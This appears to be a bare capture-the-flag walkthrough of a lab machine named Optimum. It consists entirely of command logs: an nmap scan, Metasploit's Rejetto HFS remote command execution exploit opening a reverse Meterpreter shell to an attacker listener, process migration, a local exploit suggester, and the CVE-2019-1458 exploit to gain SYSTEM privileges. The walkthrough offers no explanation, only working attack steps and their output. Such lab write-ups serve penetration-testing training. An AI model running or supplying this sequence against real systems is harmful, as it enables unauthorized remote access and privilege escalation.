nmap
```
$ sudo nmap -sC -sV 10.10.10.8

Nmap scan report for 10.10.10.8
Host is up (0.039s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

exploit: metasploit
```
$ msfconsole

msf6 > search HttpFileServer

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution

use exploit/windows/http/rejetto_hfs_exec
set RHOSTS 10.10.10.8
set LHOST tun0
run

[*] Started reverse TCP handler on 10.10.14.18:4444 
[*] Using URL: http://0.0.0.0:8080/izKafMoNqnku
[*] Local IP: http://192.168.226.128:8080/izKafMoNqnku
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /izKafMoNqnku
[*] Sending stage (175174 bytes) to 10.10.10.8
[!] Tried to delete %TEMP%\gDlyfgUCrSCizI.vbs, unknown result
[*] Meterpreter session 1 opened (10.10.14.18:4444 -> 10.10.10.8:49162) at 2021-07-14 03:47:00 -0400
[*] Server stopped.

meterpreter > getuid
Server username: OPTIMUM\kostas

meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
<snip>
 1184  1300  explorer.exe        x64   1        OPTIMUM\kostas  C:\Windows\explorer.exe
 1312  476   svchost.exe
 1416  2480  wscript.exe         x86   1        OPTIMUM\kostas  C:\Windows\SysWOW64\wscript.exe
 1432  476   dllhost.exe
 1540  476   msdtc.exe
 1548  544   WmiPrvSE.exe
 1772  544   WmiPrvSE.exe
 1932  476   WmiApSrv.exe
 1956  700   taskhostex.exe      x64   1        OPTIMUM\kostas  C:\Windows\System32\taskhostex.exe
 2012  476   vds.exe
 2232  2436  conhost.exe         x64   1        OPTIMUM\kostas  C:\Windows\System32\conhost.exe
 2436  3008  cmd.exe             x86   1        OPTIMUM\kostas  C:\Windows\SysWOW64\cmd.exe
 2452  1184  vmtoolsd.exe        x64   1        OPTIMUM\kostas  C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 2480  1184  hfs.exe             x86   1        OPTIMUM\kostas  C:\Users\kostas\Desktop\hfs.exe
 3008  1416  RuZoZCkeSuR.exe     x86   1        OPTIMUM\kostas  C:\Users\kostas\AppData\Local\Temp\rad0889D.tmp\RuZ
                                                                oZCkeSuR.exe
meterpreter > migrate 1184
[*] Migrating from 3008 to 1184...
[*] Migration completed successfully.

meterpreter > bg
[*] Backgrounding session 1...

search local_exploit_suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester


use post/multi/recon/local_exploit_suggester
set SESSION 1
run

[*] 10.10.10.8 - Collecting local exploits for x64/windows...
[*] 10.10.10.8 - 28 exploit checks are being tried...
[+] 10.10.10.8 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
[+] 10.10.10.8 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
[+] 10.10.10.8 - exploit/windows/local/cve_2019_1458_wizardopium: The target appears to be vulnerable.
[*] Post module execution completed

use exploit/windows/local/cve_2019_1458_wizardopium
set SESSION 1
set LHOST tun0
set LPORT 4545

[*] Started reverse TCP handler on 10.10.14.18:4545 
[*] Executing automatic check (disable AutoCheck to override)
[+] The target appears to be vulnerable.
[*] Launching notepad.exe to host the exploit...
[+] Process 540 launched.
[*] Injecting exploit into 540 ...
[*] Exploit injected. Injecting payload into 540...
[*] Payload injected. Executing exploit...
[*] Sending stage (200262 bytes) to 10.10.10.8
[*] Meterpreter session 2 opened (10.10.14.18:4545 -> 10.10.10.8:49163) at 2021-07-14 03:53:32 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```